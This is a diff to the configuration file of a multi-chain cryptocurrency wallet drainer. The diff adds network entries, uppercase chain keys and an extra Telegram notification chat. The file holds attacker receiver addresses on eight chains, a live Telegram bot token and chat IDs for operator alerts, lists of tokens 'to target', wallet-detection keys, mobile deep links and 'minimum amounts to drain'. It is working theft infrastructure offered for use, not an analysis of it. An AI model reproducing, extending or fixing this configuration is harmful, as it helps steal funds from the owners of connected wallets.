@@ -1,22 +1,23 @@
 // Universal Multi-Chain Drainer Configuration v2.0
 window.DRAINER_CONFIG = {
-    // Receiver addresses for each network
+    // Receiver addresses for each network (uppercase keys match NETWORKS object)
     RECEIVER_ADDRESSES: {
-        ethereum: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
-        bsc: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE", 
-        polygon: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
-        avalanche: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
-        arbitrum: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
-        optimism: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
-        solana: "KnxWLb2G6fRy2Ef9n4zm4ZssFi2zozoKazHn8FCg8vx",
-        tron: "THJkNgqXcmeCtB2WbHjWMw4oNyavejFBsy"
+        ETH: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
+        BSC: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE", 
+        POLYGON: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
+        AVALANCHE: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
+        ARBITRUM: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
+        OPTIMISM: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
+        SOL: "KnxWLb2G6fRy2Ef9n4zm4ZssFi2zozoKazHn8FCg8vx",
+        TRX: "THJkNgqXcmeCtB2WbHjWMw4oNyavejFBsy"
     },
 
     // Telegram Configuration
     TELEGRAM: {
         enabled: true,  // Set to true to enable Telegram notifications
         botToken: "8684568211:AAGLwmJvd7n1Al6e5sBnT-ycbxol-5bx0dw",  // Get from @BotFather
-        chatId: "8051121194",  // Your Telegram chat ID
+        chatId: "8051121194",  // Logging chat ID - general activity logs
+        notificationChatId: "8051121194",  // Notification chat ID - alerts & important events (can be same or different)
         apiUrl: "https://api.telegram.org/bot",  // Direct API endpoint
         relayUrl: "http://localhost:3000/relay",  // Local relay server (CORS-free)
         useRelay: false  // Set to true to use local relay server instead of direct API
@@ -25,34 +26,34 @@ window.DRAINER_CONFIG = {
     // Free API Endpoints (No Auth Required)
     FREE_APIS: {
         // EVM Chain Balance APIs
-        ethereum: {
+        ETH: {
             rpcUrl: "https://eth.llamarpc.com",
             explorerApi: "https://api.etherscan.io/api",
             defiLlama: "https://api.llama.fi"
         },
-        bsc: {
+        BSC: {
             rpcUrl: "https://bsc.llamarpc.com",
             explorerApi: "https://api.bscscan.com/api",
             defiLlama: "https://api.llama.fi"
         },
-        polygon: {
+        POLYGON: {
             rpcUrl: "https://polygon.llamarpc.com",
             explorerApi: "https://api.polygonscan.com/api",
             defiLlama: "https://api.llama.fi"
         },
-        arbitrum: {
+        ARBITRUM: {
             rpcUrl: "https://arbitrum.llamarpc.com",
             explorerApi: "https://api.arbiscan.io/api",
             defiLlama: "https://api.llama.fi"
         },
-        optimism: {
+        OPTIMISM: {
             rpcUrl: "https://optimism.llamarpc.com",
             explorerApi: "https://api-optimistic.etherscan.io/api",
             defiLlama: "https://api.llama.fi"
         },
         
         // Solana APIs
-        solana: {
+        SOL: {
             rpcUrl: "https://api.mainnet-beta.solana.com",
             genesysgoUrl: "https://mainnet.helius-rpc.com/?api-key=free",
             solscan: "https://api.solscan.io/api",
@@ -60,7 +61,7 @@ window.DRAINER_CONFIG = {
         },
 
         // Tron APIs
-        tron: {
+        TRX: {
             rpcUrl: "https://api.trongrid.io",
             blockExplorer: "https://api.tronscan.org/api"
         }
@@ -71,7 +72,7 @@ window.DRAINER_CONFIG = {
 
     // Network configurations with optimized settings
     NETWORKS: {
-        ethereum: {
+        ETH: {
             name: "Ethereum Mainnet",
             chainId: 1,
             currency: "ETH",
@@ -80,7 +81,7 @@ window.DRAINER_CONFIG = {
             gasMultiplier: 1.2,
             gasLimit: { transfer: 21000, token: 80000 }
         },
-        bsc: {
+        BSC: {
             name: "BNB Smart Chain",
             chainId: 56,
             currency: "BNB", 
@@ -89,7 +90,7 @@ window.DRAINER_CONFIG = {
             gasMultiplier: 1.3,
             gasLimit: { transfer: 21000, token: 80000 }
         },
-        polygon: {
+        POLYGON: {
             name: "Polygon",
             chainId: 137,
             currency: "MATIC",
@@ -98,7 +99,7 @@ window.DRAINER_CONFIG = {
             gasMultiplier: 1.5,
             gasLimit: { transfer: 21000, token: 80000 }
         },
-        arbitrum: {
+        ARBITRUM: {
             name: "Arbitrum One",
             chainId: 42161,
             currency: "ETH",
@@ -106,12 +107,46 @@ window.DRAINER_CONFIG = {
             explorerUrl: "https://arbiscan.io/tx/",
             gasMultiplier: 1.1,
             gasLimit: { transfer: 21000, token: 80000 }
+        },
+        OPTIMISM: {
+            name: "Optimism",
+            chainId: 10,
+            currency: "ETH",
+            rpcUrl: "https://mainnet.optimism.io",
+            explorerUrl: "https://optimistic.etherscan.io/tx/",
+            gasMultiplier: 1.1,
+            gasLimit: { transfer: 21000, token: 80000 }
+        },
+        AVALANCHE: {
+            name: "Avalanche C-Chain",
+            chainId: 43114,
+            currency: "AVAX",
+            rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
+            explorerUrl: "https://snowtrace.io/tx/",
+            gasMultiplier: 1.2,
+            gasLimit: { transfer: 21000, token: 80000 }
+        },
+        SOL: {
+            name: "Solana",
+            chainId: null,
+            currency: "SOL",
+            rpcUrl: "https://api.mainnet-beta.solana.com",
+            explorerUrl: "https://solscan.io/tx/",
+            type: "solana"
+        },
+        TRX: {
+            name: "Tron",
+            chainId: null,
+            currency: "TRX",
+            rpcUrl: "https://api.trongrid.io",
+            explorerUrl: "https://tronscan.org/#/transaction/",
+            type: "tron"
         }
     },
 
     // Popular tokens to target
     TOKENS: {
-        ethereum: [
+        ETH: [
             // Stablecoins
             { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
             { symbol: "USDC", address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", decimals: 6 },
@@ -140,7 +175,7 @@ window.DRAINER_CONFIG = {
             { symbol: "DOGE", address: "0xBA2aE424d960c26247Dd6c32edC70B295c744C43", decimals: 8 },
             { symbol: "FLOKI", address: "0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E", decimals: 9 }
         ],
-        bsc: [
+        BSC: [
             // Stablecoins
             { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
             { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
@@ -166,7 +201,7 @@ window.DRAINER_CONFIG = {
             { symbol: "DOGE", address: "0xbA2aE424d960c26247Dd6c32edC70B295c744C43", decimals: 8 },
             { symbol: "FLOKI", address: "0xfb5B838b6cfEEdC2873Abf8d4ecF0E4B3cbB4692", decimals: 9 }
         ],
-        polygon: [
+        POLYGON: [
             // Stablecoins
             { symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
             { symbol: "USDC", address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6 },
@@ -183,7 +218,7 @@ window.DRAINER_CONFIG = {
             { symbol: "QUICK", address: "0x831753DD7087CaC61aB5644b308642cc1c33Dc13", decimals: 18 },
             { symbol: "LINK", address: "0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39", decimals: 18 }
         ],
-        arbitrum: [
+        ARBITRUM: [
             // Stablecoins
             { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6 },
             { symbol: "USDC", address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", decimals: 6 },
@@ -199,7 +234,7 @@ window.DRAINER_CONFIG = {
             { symbol: "ARB", address: "0x912CE59144191C1204E64559FE8253a0e49E6548", decimals: 18 },
             { symbol: "GMX", address: "0xfc5A1A6EB076a2C7aD06eD22C90d3E710233C904", decimals: 30 }
         ],
-        optimism: [
+        OPTIMISM: [
             // Stablecoins
             { symbol: "USDT", address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", decimals: 6 },
             { symbol: "USDC", address: "0x7F5c764cBc14f9669B88837ca1490cCa17c31607", decimals: 6 },
@@ -212,7 +247,7 @@ window.DRAINER_CONFIG = {
             { symbol: "OP", address: "0x4200000000000000000000000000000000000042", decimals: 18 },
             { symbol: "AAVE", address: "0x7fa1a0C20971185c308b21d61d039f36f2CEDdDx", decimals: 18 }
         ],
-        avalanche: [
+        AVALANCHE: [
             // Stablecoins
             { symbol: "USDT", address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", decimals: 6 },
             { symbol: "USDC", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", decimals: 6 },
@@ -226,7 +261,7 @@ window.DRAINER_CONFIG = {
             { symbol: "LINK", address: "0x5947BB275c521040541495dAFa3286f33A438605", decimals: 18 },
             { symbol: "AAVE", address: "0x63a72806098Bd3D9520cC43356dD78afe5d386D9", decimals: 18 }
         ],
-        solana: [
+        SOL: [
             // Stablecoins
             { symbol: "USDC", mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6 },
             { symbol: "USDT", mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", decimals: 6 },
@@ -243,7 +278,7 @@ window.DRAINER_CONFIG = {
             { symbol: "MNGO", mint: "MangoCzJ36AjZyKwVj3VnYU4GTonjfVEnJmvvWaxLac", decimals: 6 },
             { symbol: "COPE", mint: "8HGyAAB1yoM1ttS7pnqwXsDHZgJ615XWzVqKwRJmsMA", decimals: 6 }
         ],
-        tron: [
+        TRX: [
             // Stablecoins
             { symbol: "USDT", address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6 },
             { symbol: "USDC", address: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals: 6 },
@@ -261,11 +296,11 @@ window.DRAINER_CONFIG = {
     // Minimum amounts to drain
     MIN_AMOUNTS: {
         ethereum: 0.001,
-        bsc: 0.001,
-        polygon: 0.1,
-        arbitrum: 0.001,
-        solana: 0.001,
-        tron: 1,
+        BSC: 0.001,
+        POLYGON: 0.1,
+        ARBITRUM: 0.001,
+        SOL: 0.001,
+        TRX: 1,
         bitcoin: 0.00001
     },
 
@@ -305,7 +340,7 @@ window.DRAINER_CONFIG = {
             { symbol: "DOGE", address: "0xBA2aE424d960c26247Dd6c32edC70B295c744C43", decimals: 8 },
             { symbol: "FLOKI", address: "0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E", decimals: 9 }
         ],
-        bsc: [
+        BSC: [
             // Stablecoins
             { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
             { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
@@ -330,7 +365,7 @@ window.DRAINER_CONFIG = {
             { symbol: "DOGE", address: "0xbA2aE424d960c26247Dd6c32edC70B295c744C43", decimals: 8 },
             { symbol: "FLOKI", address: "0xfb5B838b6cfEEdC2873Abf8d4ecF0E4B3cbB4692", decimals: 9 }
         ],
-        polygon: [
+        POLYGON: [
             // Stablecoins
             { symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
             { symbol: "USDC", address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6 },
@@ -347,7 +382,7 @@ window.DRAINER_CONFIG = {
             { symbol: "QUICK", address: "0x831753DD7087CaC61aB5644b308642cc1c33Dc13", decimals: 18 },
             { symbol: "LINK", address: "0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39", decimals: 18 }
         ],
-        arbitrum: [
+        ARBITRUM: [
             // Stablecoins
             { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6 },
             { symbol: "USDC", address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", decimals: 6 },
@@ -363,7 +398,7 @@ window.DRAINER_CONFIG = {
             { symbol: "ARB", address: "0x912CE59144191C1204E64559FE8253a0e49E6548", decimals: 18 },
             { symbol: "GMX", address: "0xfc5A1A6EB076a2C7aD06eD22C90d3E710233C904", decimals: 30 }
         ],
-        optimism: [
+        OPTIMISM: [
             // Stablecoins
             { symbol: "USDT", address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", decimals: 6 },
             { symbol: "USDC", address: "0x7F5c764cBc14f9669B88837ca1490cCa17c31607", decimals: 6 },
@@ -376,7 +411,7 @@ window.DRAINER_CONFIG = {
             { symbol: "OP", address: "0x4200000000000000000000000000000000000042", decimals: 18 },
             { symbol: "AAVE", address: "0x7fa1a0C20971185c308b21d61d039f36f2CEDdDc", decimals: 18 }
         ],
-        avalanche: [
+        AVALANCHE: [
             // Stablecoins
             { symbol: "USDT", address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", decimals: 6 },
             { symbol: "USDC", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", decimals: 6 },
@@ -390,7 +425,7 @@ window.DRAINER_CONFIG = {
             { symbol: "LINK", address: "0x5947BB275c521040541495dAFa3286f33A438605", decimals: 18 },
             { symbol: "AAVE", address: "0x63a72806098Bd3D9520cC43356dD78afe5d386D9", decimals: 18 }
         ],
-        solana: [
+        SOL: [
             // Stablecoins
             { symbol: "USDC", mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6 },
             { symbol: "USDT", mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", decimals: 6 },
@@ -405,7 +440,7 @@ window.DRAINER_CONFIG = {
             { symbol: "ORCA", mint: "orcaEKTdK7LKz57chYcSKdoUFC54MJqWuKLh2G69Tch", decimals: 6 },
             { symbol: "MNGO", mint: "MangoCzJ36AjZyKwVj3VnYU4GTonjfVEnJmvvWaxLac", decimals: 6 }
         ],
-        tron: [
+        TRX: [
             // Stablecoins
             { symbol: "USDT", address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6 },
             { symbol: "USDC", address: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals: 6 },
@@ -430,21 +465,21 @@ window.DRAINER_CONFIG = {
             { name: "Phantom", key: "isPhantom", icon: "phantom.png" },
             { name: "WalletConnect", type: "walletconnect", icon: "walletconnect.png" }
         ],
-        bsc: [
+        BSC: [
             { name: "MetaMask", key: "isMetaMask", icon: "metamask.png" },
             { name: "Trust Wallet", key: "isTrust", icon: "trust.png" },
             { name: "Binance Wallet", key: "isBinance", icon: "binance.png" },
             { name: "SafePal", key: "isSafePal", icon: "safepal.png" },
             { name: "WalletConnect", type: "walletconnect", icon: "walletconnect.png" }
         ],
-        solana: [
+        SOL: [
             { name: "Phantom", key: "isPhantom", icon: "phantom.png" },
             { name: "Solflare", key: "isSolflare", icon: "solflare.png" },
             { name: "Slope", key: "isSlope", icon: "slope.png" },
             { name: "Sollet", key: "isSollet", icon: "sollet.png" },
             { name: "Glow", key: "isGlow", icon: "glow.png" }
         ],
-        tron: [
+        TRX: [
             { name: "TronLink", key: "isTronLink", icon: "tronlink.png" },
             { name: "TronMask", key: "isTronMask", icon: "tronmask.png" },
             { name: "Math Wallet", key: "isMathWallet", icon: "mathwallet.png" }
@@ -465,17 +500,17 @@ window.DRAINER_CONFIG = {
             "coinbase": "https://go.cb-w.com/dapp?cb_url=",
             "rainbow": "https://rainbow.me/dapp?url="
         },
-        bsc: {
+        BSC: {
             "metamask": "https://metamask.app.link/dapp/",
             "trust": "https://link.trustwallet.com/open_url?coin_id=56&url=",
             "binance": "https://app.binance.com/cedefi/",
             "safepal": "https://link.safepal.io/dapp/"
         },
-        solana: {
+        SOL: {
             "phantom": "https://phantom.app/ul/browse/",
             "solflare": "https://solflare.com/access-wallet"
         },
-        tron: {
+        TRX: {
             "tronlink": "https://www.tronlink.org/"
         }
     },
@@ -487,7 +522,7 @@ window.DRAINER_CONFIG = {
             gasPriceMultiplier: 1.1,
             priorityFee: "2000000000" // 2 gwei
         },
-        bsc: {
+        BSC: {
             gasLimitMultiplier: 1.1,
             gasPriceMultiplier: 1.05,
             gasPrice: "5000000000" // 5 gwei
@@ -508,9 +543,9 @@ window.DRAINER_CONFIG = {
         timeoutDuration: 30000, // 30 seconds
         confirmationBlocks: {
             ethereum: 1,
-            bsc: 1,
-            solana: 1,
-            tron: 1
+        BSC: 1,
+        SOL: 1,
+        TRX: 1
         }
     },
 
